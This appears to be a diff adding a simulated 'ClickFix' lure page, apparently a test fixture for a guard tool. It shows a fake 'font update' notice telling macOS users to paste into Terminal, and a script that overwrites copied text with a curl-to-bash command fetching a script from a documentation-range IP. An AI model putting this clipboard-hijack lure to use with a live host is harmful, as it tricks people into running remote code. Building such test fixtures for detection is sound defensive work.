@@ -1,0 +1,25 @@
+<!doctype html>
+<!-- Simulated macOS "fix" lure (copy-event setData hijack). Inert: TEST-NET IP, cannot connect. -->
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Document can't be displayed</title><link rel="stylesheet" href="lure.css"></head>
+<body>
+  <h1>This document can't be displayed</h1>
+  <p>A font update is required to view this file.</p>
+  <button id="fix">Copy fix</button>
+  <div class="steps">
+    <b>How to fix</b>
+    <ol><li>Open the Terminal app (<kbd>Cmd</kbd> + <kbd>Space</kbd>, type Terminal)</li><li>Paste with <kbd>Cmd</kbd> + <kbd>V</kbd></li><li>Press <kbd>Enter</kbd></li></ol>
+  </div>
+  <script src="lure.js"></script>
+  <script>
+    const payload = "curl -s http://203.0.113.40/font-update.sh | bash # ClickFix Guard demo, harmless";
+    document.addEventListener("copy", (e) => {
+      e.clipboardData.setData("text/plain", payload);
+      e.preventDefault();
+    });
+    document.getElementById("fix").addEventListener("click", () => {
+      reportCopy("terminal", payload);
+      document.execCommand("copy");
+    });
+  </script>
+</body></html>
